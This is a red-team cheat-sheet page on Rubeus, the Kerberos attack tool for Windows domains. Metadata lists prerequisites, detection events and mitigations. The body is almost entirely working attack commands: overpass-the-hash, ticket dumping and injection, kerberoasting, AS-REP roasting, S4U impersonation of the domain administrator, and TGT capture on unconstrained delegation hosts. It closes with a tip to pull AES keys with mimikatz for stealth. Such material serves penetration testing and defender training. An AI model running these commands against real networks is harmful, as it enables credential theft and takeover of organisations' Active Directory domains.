---
title: Rubeus
category: AD / Windows tooling
order: 20
tags: [rubeus, kerberos, ptt, s4u, roast, overpass, windows]
summary: >
  The Kerberos swiss-army knife for Windows: request/renew TGTs, roast, harvest
  and inject tickets, do S4U delegation, overpass-the-hash and capture incoming
  TGTs on unconstrained hosts.
prerequisites:
  - Code execution on a domain-joined Windows host
  - Elevation for ticket dumping / monitoring (not for asktgt / tgtdeleg / roast)
tools: [Rubeus (GhostPack)]
detection:
  - 4769 RC4 TGS bursts (roast); abnormal S4U; ticket injection; 4104 script/EDR on Rubeus.exe
mitigation:
  - AES-only, strong service passwords, Protected Users, EDR on LSASS/ticket ops
refs:
  - { label: "Rubeus", url: "https://github.com/GhostPack/Rubeus" }
  - { label: "SpecterOps — Rubeus roasting", url: "https://posts.specterops.io/" }
---

## Tickets in / out

```powershell
Rubeus.exe asktgt /user:$user /rc4:$nthash /nowrap        # overpass-the-hash (NT)
Rubeus.exe asktgt /user:$user /aes256:$aeskey /ptt        # quieter (AES)
Rubeus.exe tgtdeleg /nowrap                               # usable TGT, no elevation
Rubeus.exe triage                                         # list tickets
Rubeus.exe dump /nowrap                                   # export tickets (elevated)
Rubeus.exe ptt /ticket:<base64|kirbi>                     # inject
```

## Roasting

```powershell
Rubeus.exe kerberoast /nowrap /outfile:kerb.txt
Rubeus.exe asreproast /nowrap /outfile:asrep.txt
```

## Delegation (S4U)

```powershell
Rubeus.exe s4u /user:$computer /rc4:$nthash /impersonateuser:administrator /msdsspn:$spn /ptt
```

## Capture on an unconstrained host

```powershell
Rubeus.exe monitor /interval:5 /nowrap
# coerce a DC toward this host (see Delegation / Unconstrained), then extract its TGT
```

> Pair with mimikatz `sekurlsa::ekeys` to grab the AES key for `asktgt /aes256`
> instead of the NT hash — survives RC4 hardening and is stealthier.
